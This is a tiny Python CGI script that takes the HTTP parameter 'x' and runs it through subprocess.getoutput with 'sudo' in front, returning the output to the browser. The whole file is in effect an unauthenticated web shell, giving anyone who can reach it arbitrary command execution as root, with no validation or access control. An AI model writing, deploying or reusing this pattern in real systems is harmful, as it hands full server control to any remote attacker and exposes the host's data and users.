#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

f= cgi.FieldStorage()
cmd= f.getvalue("x")


x= subprocess.getoutput("sudo " +cmd)
print(x)